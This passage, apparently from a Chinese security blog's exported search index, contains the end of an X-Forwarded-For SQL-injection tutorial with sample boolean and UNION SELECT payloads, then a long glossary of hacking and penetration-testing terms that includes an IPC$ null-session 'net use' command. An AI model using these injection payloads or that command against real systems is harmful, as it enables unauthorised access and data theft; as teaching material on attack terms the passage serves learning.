class="line">getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)</span><br></pre></td></tr></table></figure><p>获取远程客户端的HTTP_X_FORWARDED_FOR的值 </p><p>没有进行过滤拼接SQL语句带入查询造成注入</p><h5 id="在黑盒环境下-xff-注入攻击"><a href="#在黑盒环境下-xff-注入攻击" class="headerlink" title="在黑盒环境下 xff 注入攻击"></a>在黑盒环境下 <strong>xff</strong> 注入攻击</h5><p>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ </p><p>用户在注册的时候，如果存在安全隐患 会出现错误页面或者报错。</p><p>从而导致注册或者登录用户失败。</p><p>burpsuite 抓包 提交 输入检测语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=1#</span><br><span class="line"></span><br><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=2#</span><br></pre></td></tr></table></figure><p>两次提交返回不一样 存在 SQL 注入漏洞</p><p>获取敏感信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: -127.0.0.1&#x27;union select 1,2,3,user()#</span><br></pre></td></tr></table></figure><p>输入提交包 后看到页面返回 root@loclhost</p><p>搜索框注入</p><h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h3><h3 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h3><h3 id="Order-by注入"><a href="#Order-by注入" class="headerlink" title="Order by注入"></a>Order by注入</h3><h3 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h3><h3 id="DNSlog对外注入"><a href="#DNSlog对外注入" class="headerlink" title="DNSlog对外注入"></a>DNSlog对外注入</h3><h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><h3 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h3><h3 id="MsSQL注入-SQL-SERVER"><a href="#MsSQL注入-SQL-SERVER" class="headerlink" title="MsSQL注入 SQL SERVER"></a>MsSQL注入 SQL SERVER</h3><h3 id="Postgre-sql注入"><a href="#Postgre-sql注入" class="headerlink" title="Postgre sql注入"></a>Postgre sql注入</h3><h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透术语介绍</title>
      <link href="/posts/9d74.html"/>
      <url>/posts/9d74.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、术语介绍"><a href="#一、术语介绍" class="headerlink" title="一、术语介绍"></a>一、术语介绍</h1><h2 id="肉鸡（肉鸡）"><a href="#肉鸡（肉鸡）" class="headerlink" title="肉鸡（肉鸡）"></a>肉鸡（肉鸡）</h2><p>肉鸡也称傀儡机，是指可以被黑客远程控制的机器。比如用”灰鸽子”等诱导客户点击或者电脑被黑客攻破或用户电脑有漏洞被种植了木马，黑客可以随意操纵它并利用它做任何事情。</p><p>简单来说：肉鸡是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，可以是各种系统。可以是普通的个人电脑，也可以是大型的服务器，我们可以象操作自己的电脑那样来操作它们，而不被对方所发觉。</p><p>肉鸡通常被用作DDOS攻击。可以是各种系统，如windows、linux、unix等，更可以是一家公司、企业、学校甚至是政府军队的服务器。</p><h2 id="抓鸡（抓鸡）"><a href="#抓鸡（抓鸡）" class="headerlink" title="抓鸡（抓鸡）"></a>抓鸡（抓鸡）</h2><p>抓鸡是黑客界的一种流行语言.这里所说的”鸡”,是指电脑肉鸡、网络摄像头、路由器、等联网设备。</p><p>简单来说：就是想尽一切办法控制电脑，将其沦为肉鸡。</p><h2 id="堡垒机（堡垒机）"><a href="#堡垒机（堡垒机）" class="headerlink" title="堡垒机（堡垒机）"></a>堡垒机（堡垒机）</h2><p>简单来说：运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</p><p>堡垒机综合了核心系统运维和安全审计管控两大主干功能。终端计算机对目标的访问，均需要经过运维安全审计的翻译。</p><h2 id="木马（木马）"><a href="#木马（木马）" class="headerlink" title="木马（木马）"></a>木马（木马）</h2><p>木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</p><p>木马病毒其实是计算机黑客用于远程控制计算机的程序，将控制程序寄生于被控制的计算机系统中，里应外合，对被感染木马病毒的计算机实施操作。</p><p>一般的木马病毒程序主要是寻找计算机后门，伺机窃取被控计算机中的密码和重要文件等。</p><p>可以对被控计算机实施监控、资料修改等非法操作。木马病毒具有很强的隐蔽性，可以根据黑客意图突然发起攻击。</p><p>简单来说：木马就是那些表面上伪装成了正常的程序，但是当这些被程序运行时，就会获取系统的整个控制权限，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。</p><p>有很多黑客就是热中与使用木马程序来控制别人的电脑，比如灰鸽子，黑洞，PcShare等等</p><h2 id="大马（大马）"><a href="#大马（大马）" class="headerlink" title="大马（大马）"></a>大马（大马）</h2><p>特点：体积大，功能全，会调用系统的关键函数，以代码加密进行隐藏的webshell</p><p>简单来说：功能强大的网页后门，能执行命令，操作文件，连接数据库</p><h2 id="小马（小马）"><a href="#小马（小马）" class="headerlink" title="小马（小马）"></a>小马（小马）</h2><p>特点：体积小，功能少，只有一个上传功能的webshell。</p><p>简单来说：比较单一的网页后门。一般是上传保存大马。asp小马asp旁注小马</p><h2 id="挂马（挂马）"><a href="#挂马（挂马）" class="headerlink" title="挂马（挂马）"></a>挂马（挂马）</h2><p>所谓的挂马，就是黑客通过各种手段，包括SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day,等各种方法获得网站管理员账号，然后登陆网站后台，通过数据库“备份/恢复”或者上传漏洞获得一个webshell。</p><p>利用获得的webshell修改网站页面的内容，向页面中加入恶意转向代码。</p><p>也可以直接通过弱口令获得服务器或者网站FTP，然后直接对网站页面直接进行修改。</p><p>当你访问被加入恶意代码的页面时，你就会自动的访问被转向的地址或者下载木马病毒。</p><p>简单来说：就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马</p><h2 id="网页木马（网页木马）"><a href="#网页木马（网页木马）" class="headerlink" title="网页木马（网页木马）"></a>网页木马（网页木马）</h2><p>简单来说：表面上伪装成普通的网页文件或是将自已的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马下载到访问者的电脑上来自动执行。</p><p>网页木马并不是木马程序，而应该称为网页木马“种植器”，也即一种通过攻击浏览器或浏览器外挂程序的漏洞，向目标用户机器植入木马、病毒、密码盗取等恶意程序的手段</p><h2 id="一句话木马（一句话木马）"><a href="#一句话木马（一句话木马）" class="headerlink" title="一句话木马（一句话木马）"></a>一句话木马（一句话木马）</h2><p>简单来说：短小精悍的木马，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p><h2 id="后门（后门）"><a href="#后门（后门）" class="headerlink" title="后门（后门）"></a>后门（后门）</h2><p>后门，本意是指一座建筑背面开设的门，通常比较隐蔽，为进出建筑的人提供方便和隐蔽。在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</p><p>简单来说：这是一种形象的比喻，攻击者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。</p><p>这些改动表面上是很难被察觉的，但是攻击者却可以使用相应的程序或者方法来轻易的与这台电脑建立连接，重新控制这台电脑，就好象是攻击者偷偷的配了一把主人房间的要是，可以随时进出而不被主人发现一样。</p><p>通常大多数的特洛伊木马（TrojanHorse）程序都可以被攻击者用语制作后门（BackDoor）</p><h2 id="一句话后门（一句话后门）"><a href="#一句话后门（一句话后门）" class="headerlink" title="一句话后门（一句话后门）"></a>一句话后门（一句话后门）</h2><p>一句话后门是Web渗透中用得最多的一个必备工具，流行一句话后门分为Asp、Asp.net、Jsp和Php四种类型。</p><p>一句话后门利用的实质就是通过执行SQL语句、添加或者更改字段内容等操作。</p><p>简单来说：一段很小的网页代码后门，可以用客户端连接，对网站进行控制。如中国菜刀。服务端是一句话后门。</p><h2 id="Shell（shell）"><a href="#Shell（shell）" class="headerlink" title="Shell（shell）"></a>Shell（shell）</h2><p>在计算机科学中，Shell俗称壳（用来区别于核），是指为使用者提供操作界面的软件。它类似于DOS下的COMMAND.COM和后来的CMD.exe。它接收用户命令，然后调用相应的应用程序。</p><p>简单来说：就是指的是一种命令指行环境，比如我们按下键盘上的“开始键+R”时出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这个就是WINDOWS的Shell执行环境。</p><p>通常我们使用远程溢出程序成功溢出远程电脑后得到的那个用于执行系统命令的环境就是对方的shell</p><h2 id="webshell（webshelwebshell）"><a href="#webshell（webshelwebshell）" class="headerlink" title="webshell（webshelwebshell）"></a>webshell（webshelwebshell）</h2><p>简单来说就是：webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门。</p><p>webshell分类：根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。根绝时代和技术的变迁，国外也有用python编写的脚本木马，不过国内常用的无外乎三种，大马，小马，一句话木马，具体使用场景和特地如下图。</p><p>国内常用的webshell有海阳ASP木马，Phpspy，c99shell等</p><p>黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><p>可以上传下载文件，查看数据库，执行任意程序命令等。</p><h2 id="交互式shell（交互式shell）"><a href="#交互式shell（交互式shell）" class="headerlink" title="交互式shell（交互式shell）"></a>交互式shell（交互式shell）</h2><p>简单来说：交互式模式就是shell等待你的输入，并且执行你提交的命令。</p><p>这种模式被称作交互式是因为shell与用户进行交互。</p><p>这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。</p><p>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与用户进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p><h2 id="远控（远控）"><a href="#远控（远控）" class="headerlink" title="远控（远控）"></a>远控（远控）</h2><p>简单来说：就是远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术。</p><p>这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。</p><h2 id="拖库（拖库）"><a href="#拖库（拖库）" class="headerlink" title="拖库（拖库）"></a>拖库（拖库）</h2><p>拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库文件，拖库的主要防护手段是数据库加密。</p><p>拖库可以通过数据库安全防护技术解决，数据库安全技术主要包括：数据库加密，防火墙，数据脱敏等。</p><p>简单来说：黑客入侵数据库后把数据库导出来。</p><h2 id="社工库（社工库）"><a href="#社工库（社工库）" class="headerlink" title="社工库（社工库）"></a>社工库（社工库）</h2><p>社工库是黑客与大数据方式进行结合的一种产物，黑客们将泄漏的用户数据整合分析，然后集中归档的一个地方</p><p>这些用户数据大部分来自社工库论坛上，黑客们脱库撞库获得的数据包，包含的数据类型除了账号密码外，还包含被攻击网站所属不同行业所带来的附加数据。</p><p>简单来说：社工库是黑客的一种攻击方式，去获取敏感信息。</p><h2 id="撞库（撞库）"><a href="#撞库（撞库）" class="headerlink" title="撞库（撞库）"></a>撞库（撞库）</h2><p>简单来说：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</p><p>很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。</p><p>撞库可采用大数据安全技术来防护，比如：用数据资产梳理发现敏感数据，使用数据库加密保护核心数据，使用数据库安全运维防运维人员撞库攻击等。</p><h2 id="社会工程学（社会工程学）"><a href="#社会工程学（社会工程学）" class="headerlink" title="社会工程学（社会工程学）"></a>社会工程学（社会工程学）</h2><p>社会工程学（Social Engineering，又被翻译为：社交工程学）在上世纪60年代左右作为正式的学科出现。</p><p>广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题，经过多年的应用发展，社会工程学逐渐产生出了分支学科，如公安社会工程学和网络社会工程学。 </p><p>简单来说：社会工程学攻击是一种通过对被攻击者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱所采取的诸如欺骗、伤害等危害手段，获取自身利益的手法。</p><h2 id="权限（权限）"><a href="#权限（权限）" class="headerlink" title="权限（权限）"></a>权限（权限）</h2><p>权限是指为了保证职责的有效履行，任职者必须具备的，对某事项进行决策的范围和程度。</p><p>在多用户计算机系统的管理中，权限（privilege）是指某个特定的用户具有特定的系统资源使用权力，像是文件夹，特定系统指令的使用或存储量的限制。</p><p>通常，系统管理员，或者在网络中的网络管理员，对某个特定资源的使用分配给用户不同的权限，系统软件则自动地强制执行这些权限。</p><p>简单来说：权限计算机用户对于文件及目录的建立，修改，删除以及对于某些服务的访问，程序的执行，是以权限的形式来严格区分的。被赋予了相应的权限，就可以进行相应的操作，否则就不可以。</p><h2 id="提权（提权）"><a href="#提权（提权）" class="headerlink" title="提权（提权）"></a>提权（提权）</h2><p>提权，顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是<br>guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。</p><p>提权是黑客的专业名词，一般用于网站入侵和系统入侵中。</p><h2 id="弱口令（弱口令）"><a href="#弱口令（弱口令）" class="headerlink" title="弱口令（弱口令）"></a>弱口令（弱口令）</h2><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p><p>弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。</p><p>简单来说：弱口令指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）、常见top100、top1000弱口令</p><h2 id="溢出（溢出）"><a href="#溢出（溢出）" class="headerlink" title="溢出（溢出）"></a>溢出（溢出）</h2><p>溢出是黑客利用操作系统的漏洞，专门开发了一种程序，加相应的参数运行后，就可以得到你电脑具有管理员资格的控制权，你在你自己电脑上能够运行的东西他可以全部做到，等于你的电脑就是他的了。溢出是程序设计者设计时的不足所带来的错误。</p><p>溢出：确切的讲，应该是“缓冲区溢出”。简单的解释就是程序对接受的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。大致可以分为两类：1. 堆溢出  2. 栈溢出</p><h2 id="Root（root）"><a href="#Root（root）" class="headerlink" title="Root（root）"></a>Root（root）</h2><p>Root，也称为根用户，是Unix和类UNIX系统，及Android和iOS移动设备系统中的唯一的超级用户，因其可对根目录执行读写和执行操作而得名。其相当于windows系统中的system(XP及以下)/trustedlnstaller(Vista及以上)用户。其具有系统中的最高权限，如启动或停止一个进程，删除或增加用户，增加或者禁用硬件，新建文件、修改文件或删除所有文件等等。</p><p>简单来说：这里的root指在Linux里面root 是代表最高权限</p><h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><p>Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</p><p>rootkit：rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。</p><p>通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过，对方系统内存在的安全漏洞获得系统的root权限。</p><p>然后，攻击者就会在对方的系统中安装rootkit，以达到自己长久控制对方的目的，rootkit与我们前边提到的木马和后门很类似，但远比它们要隐蔽，黑客守卫者就是很典型的rootkit，还有国内的ntroorkit等都是不错的rootkit工具。</p><h2 id="IPC-（IPC-）"><a href="#IPC-（IPC-）" class="headerlink" title="IPC$（IPC$）"></a>IPC$（IPC$）</h2><p>空连接，使用命令 net use \*.<em>.</em>.*（IP地址）\ipc$ “” /user:”” 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。</p><p>IPC$：是共享“命名管道”的资源，它是为了让进程间通信而开放的饿命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><p>利用IPC$,连接者可以与目标主机建立一个空的连接，即无需用户名和密码就能连接主机，当然这样连接是没有任何操作权限的。但利用这个空的连接，连接者可以得到目标主机上的用户列表。</p><p>网上关于 ipc$ 入侵的文章可谓多如牛毛，攻击步骤甚至已经成了固化的模式，因此也没人愿意再把这已经成为定式的东西拿出来摆弄。</p><p>要防止别人用ipc$和默认共享入侵，需要禁止ips$空连接，避免入侵者取得用户列表，并取消默认共享。</p><h2 id="默认共享-（默认共享）"><a href="#默认共享-（默认共享）" class="headerlink" title="默认共享 （默认共享）"></a>默认共享 （默认共享）</h2><p>默认共享：默认共享是WINDOWS2000/XP/2003系统开启共享服务时自动开启所有硬盘的共享，因为加了”$”符号，所以看不到共享的托手图表，也成为隐藏共享，和上面写的 IPC$ 一样。</p><p>在Windows 2000/XP/2003系统中，逻辑分区与Windows目录默认为共享，这是为管理员管理服务器的方便而设，但却成为了别有用心之徒可乘的安全漏洞。</p><h2 id="注入（注入）"><a href="#注入（注入）" class="headerlink" title="注入（注入）"></a>注入（注入）</h2><p>注入：随着B/S模式应用开发的发展，使用这种模式编写程序的程序员越来越来越多，但是由于程序员的水平参差不齐相当大一部分应用程序存在安全隐患。</p><p>用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想要知道的数据，这个就是所谓的SQLinjection，即：SQL恶意注入。</p><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h2 id="注入点（注入点）"><a href="#注入点（注入点）" class="headerlink" title="注入点（注入点）"></a>注入点（注入点）</h2><p>注入点：是可以实行注入的地方，通常是一个访问数据库的连接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同</p><p>举个例子来说：注入点好比化作一条大街，小偷顺着大街走，发现有一家侧门没有关，进去后找到可以拿的东西卖出去，注入点就是侧门。</p><p>很多网站被黑无非是找到注入点拿到网站后台然后找出管理员账号密码来进行登录，登陆成功后百分之八十都会用到一句话木马.得到网站的webshell，得到了服务器提权后远控。</p><h2 id="C段渗透"><a href="#C段渗透" class="headerlink" title="C段渗透"></a>C段渗透</h2><p>C段下服务器入侵同一个网段内例如 202.202.0.1-2020.0.254如果拿下其中一台服务器，通过这台服务器嗅探目标服务器传输上的数据，从而获取这台服务器的权限。</p><p>常见的工具有cain。</p><p>简单来说：就是对同局域网内的其他主机进行渗透，以此来获取目标主机权限。</p><h2 id="旁站入侵（旁注）"><a href="#旁站入侵（旁注）" class="headerlink" title="旁站入侵（旁注）"></a>旁站入侵（旁注）</h2><p>旁注是一种入侵方法，在字面上解释就是”从旁注入”，利用同一主机上面不同网站的漏洞得到webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。</p><p>简单来说：就是同一个服务器上有多个站点，可以通过入侵其中一个站点，通过提权跨目录访问其他站点</p><h2 id="内网（局域网）"><a href="#内网（局域网）" class="headerlink" title="内网（局域网）"></a>内网（局域网）</h2><p>局域网自然就是局部地区形成的一个区域网络，其特点就是分布地区范围有限，可大可小，大到一栋建筑楼 与相邻建筑之间的连接，小到可以是办公室之间的联系。</p><p>局域网自身相对其他网络传输速度更快，性能更稳定，框架简易，并且是封闭性，这也是很多机构选择的原因所在。</p><p>简单来讲：就是局域网，比如网吧，公司网络，校园网，公司内部网等都属于此类。</p><p>查看IP地址如果是在以下三个范围之内的话，就说明我们是处于内网之中的：（私网IP ）</p><p>10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</p><h2 id="外网（广域网）"><a href="#外网（广域网）" class="headerlink" title="外网（广域网）"></a>外网（广域网）</h2><p>广域网，又称外网、公网。是连接不同地区局域网或城域网计算机通信的远程网。通</p><p>常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。</p><p>广域网并不等同于互联网。</p><p>外网：直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问，IP地址不是保留IP（内网）IP地址。</p><h2 id="脚本注入攻击（sql注入）"><a href="#脚本注入攻击（sql注入）" class="headerlink" title="脚本注入攻击（sql注入）"></a>脚本注入攻击（sql注入）</h2><p>所谓脚本注入攻击者把SQL命令插入到WEB表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令，在某些表单中，用户输入的内容直接用来构造动态的SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击</p><h2 id="中间人攻击（中间人攻击）"><a href="#中间人攻击（中间人攻击）" class="headerlink" title="中间人攻击（中间人攻击）"></a>中间人攻击（中间人攻击）</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）中间人攻击很早就成为了黑客常用的一种古老的攻击手段，并且一直到如今还具有极大的扩展空间。</p><p>在网络安全方面，MITM攻击的使用是很广泛的，曾经猖獗一时的SMB会话劫持、DNS欺骗等技术都是典型的MITM攻击手段。</p><p>在黑客技术越来越多的运用于以获取经济利益为目标的情况下时，MITM攻击成为对网银、网游、网上交易等最有威胁并且最具破坏性的一种攻击方式。</p><p>中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><h2 id="欺骗攻击（欺骗攻击）"><a href="#欺骗攻击（欺骗攻击）" class="headerlink" title="欺骗攻击（欺骗攻击）"></a>欺骗攻击（欺骗攻击）</h2><p>网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。</p><p>主要方式有：IP欺骗、ARP欺骗、DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等</p><h2 id="ARP攻击（ARP攻击）"><a href="#ARP攻击（ARP攻击）" class="headerlink" title="ARP攻击（ARP攻击）"></a>ARP攻击（ARP攻击）</h2><p>ARP（AddressResolutionProtocol，地址解析协议）协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><p>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。</p><p>一般情况下，受到ARP攻击的计算机会出现两种现象：<br>        1.不断弹出“本机的XXX段硬件地址与网络中的XXX段地址冲突”的对话框。<br>        2.计算机不能正常上网，出现网络中断的症状。<br>因为这种攻击是利用ARP请求报文进行“欺骗”的，所以防火墙会误以为是正常的请求数据包，不予拦截。因此普通的防火墙很难抵挡这种攻击。</p><p>ARP 病毒攻击是局域网最常见的一种攻击方式。</p><p>由于TCP/IP协议栈存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常上网和通讯安全。</p><p>当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p><h2 id="CC攻击（CC攻击）"><a href="#CC攻击（CC攻击）" class="headerlink" title="CC攻击（CC攻击）"></a>CC攻击（CC攻击）</h2><p>攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(ChallengeCollapsar)</p><p>CC主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库压力就越大，被访问的频率也越高，占用的系统资源也就相当可观。</p><p>原理：攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。</p><p>简单来说：就是在一些大的网站不断地发送大量的搜索请求，消耗服务器资源。</p><h2 id="拒绝服务攻击（拒绝服务攻击）"><a href="#拒绝服务攻击（拒绝服务攻击）" class="headerlink" title="拒绝服务攻击（拒绝服务攻击）"></a>拒绝服务攻击（拒绝服务攻击）</h2><p>拒绝服务攻击 （DOS）造成DOS的攻击行为被称为DOS攻击，其目的是使计算机或网络无法正常服务，最常见的DOS攻击有计算机网络宽带攻击和连通性攻击，连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源被消耗，最终计算机无法再处理合法用户的请求。</p><p>实对网络带宽进行的消耗性攻击只是拒绝服务攻击的一小部分，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。</p><p>拒绝服务攻击问题也一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。</p><p>攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：</p><pre><code>    一是迫使服务器的缓冲区满，不接收新的请求；    二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接 。</code></pre><p>简单来说：就是攻击者想办法让目标机器停止提供服务，是黑客常用的攻击手段之一。</p><h2 id="Dos攻击（DOS攻击）"><a href="#Dos攻击（DOS攻击）" class="headerlink" title="Dos攻击（DOS攻击）"></a>Dos攻击（DOS攻击）</h2><p>DoS是Denial of Service的简称，即拒绝服务，造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。最常见的DoS攻击有计算机网络宽带攻击和连通性攻击。</p><p>拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问</p><p>DoS攻击是指故意的攻击网络协议实现的缺陷或直接通过野蛮手段残忍地耗尽被攻击对象的资源，目的是让目标计算机或网络无法提供正常的服务或资源访问，使目标系统服务系统停止响应甚至崩溃，而在此攻击中并不包括侵入目标服务器或目标网络设备。</p><p>这些服务资源包括网络带宽，文件系统空间容量，开放的进程或者允许的连接。</p><p>这种攻击会导致资源的匮乏，无论计算机的处理速度多快、内存容量多大、网络带宽的速度多快都无法避免这种攻击带来的后果。</p><h2 id="DDOS（DDOS）"><a href="#DDOS（DDOS）" class="headerlink" title="DDOS（DDOS）"></a>DDOS（DDOS）</h2><p>分布式拒绝服务攻击可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用，分布式拒绝服务攻击已经出现了很多次，导致很多的大型网站都出现了无法进行操作的情况，这样不仅仅会影响用户的正常使用，同时造成的经济损失也是非常巨大的。</p><p>分布式拒绝服务攻击方式在进行攻击的时候，可以对源IP地址进行伪造，这样就使得这种攻击在发生的时候隐蔽性是非常好的，同时要对攻击进行检测也是非常困难的，因此这种攻击方式也成为了非常难以防范的攻击。</p><p>分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。</p><h2 id="洪水攻击（洪水攻击）"><a href="#洪水攻击（洪水攻击）" class="headerlink" title="洪水攻击（洪水攻击）"></a>洪水攻击（洪水攻击）</h2><p>是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。</p><p>洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。</p><p>常见的还有洪水攻击包含：MAC泛洪、网络泛洪等。</p><p>常见的洪水攻击方式：阿拉丁洪水攻击器、ARP攻击、DDOS攻击。</p><h2 id="SYN攻击（SYN攻击）"><a href="#SYN攻击（SYN攻击）" class="headerlink" title="SYN攻击（SYN攻击）"></a>SYN攻击（SYN攻击）</h2><p>SYN攻击是黑客攻击的手段。</p><p>SYN洪泛攻击的基础是依靠TCP建立连接时三次握手的设计。</p><p>第三个数据包验证连接发起人在第一次请求中使用的源IP地址上具有接受数据包的能力，即其返回是可达的。</p><p>据统计，在所有黑客攻击事件中，SYN攻击是最常见又最容易被利用的一种攻击手法。</p><p>如：2000年YAHOO网站遭受的攻击事例</p><p>有些网络蠕虫病毒配合SYN攻击造成更大的破坏。</p><h2 id="供应链攻击"><a href="#供应链攻击" class="headerlink" 